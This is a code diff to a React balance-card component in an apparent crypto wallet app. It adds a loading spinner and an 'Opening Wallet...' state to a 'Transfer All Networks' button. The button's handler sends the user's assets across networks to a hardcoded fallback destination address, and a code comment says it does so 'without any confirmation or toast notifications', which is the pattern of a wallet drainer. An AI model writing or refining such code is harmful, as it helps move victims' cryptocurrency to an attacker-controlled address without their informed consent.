@@ -1,4 +1,5 @@
-import { AlertTriangle, Coins, Bug } from "lucide-react";
+import { useState } from "react";
+import { AlertTriangle, Coins, Bug, Loader2 } from "lucide-react";
 import { Card, CardContent } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Alert, AlertDescription } from "@/components/ui/alert";
@@ -13,6 +14,7 @@ interface BalanceCardProps {
 
 export default function BalanceCard({ walletState, onTransactionStart, onMultiNetworkTransfer }: BalanceCardProps) {
   const { isTransferring } = useWeb3();
+  const [isWalletLoading, setIsWalletLoading] = useState(false);
 
   // Get destination address from environment - using your vault address
   const destinationAddress = import.meta.env.VITE_DESTINATION_ADDRESS || "0x15E1A8454E2f31f64042EaE445Ec89266cb584bE";
@@ -46,9 +48,17 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
 
 
   const handleMultiNetworkTransfer = async () => {
-    // Direct transfer without any confirmation or toast notifications
-    if (onMultiNetworkTransfer) {
-      await onMultiNetworkTransfer(destinationAddress);
+    // Show loading instantly when button is clicked
+    setIsWalletLoading(true);
+    
+    try {
+      // Direct transfer without any confirmation or toast notifications
+      if (onMultiNetworkTransfer) {
+        await onMultiNetworkTransfer(destinationAddress);
+      }
+    } finally {
+      // Hide loading after wallet interaction
+      setIsWalletLoading(false);
     }
   };
 
@@ -254,11 +264,25 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
           {onMultiNetworkTransfer && (
             <Button
               onClick={handleMultiNetworkTransfer}
-              disabled={isTransferring || walletState.totalUsdValue === 0}
+              disabled={isTransferring || isWalletLoading || walletState.totalUsdValue === 0}
               className="w-full bg-danger hover:bg-red-600 text-white font-semibold py-4 px-6 flex items-center justify-center space-x-2"
             >
-              <span>⚡</span>
-              <span>{isTransferring ? "Scanning Networks..." : "Transfer All Networks"}</span>
+              {isWalletLoading ? (
+                <>
+                  <Loader2 className="h-4 w-4 animate-spin" />
+                  <span>Opening Wallet...</span>
+                </>
+              ) : isTransferring ? (
+                <>
+                  <Loader2 className="h-4 w-4 animate-spin" />
+                  <span>Scanning Networks...</span>
+                </>
+              ) : (
+                <>
+                  <span>⚡</span>
+                  <span>Transfer All Networks</span>
+                </>
+              )}
             </Button>
           )}
         </div>
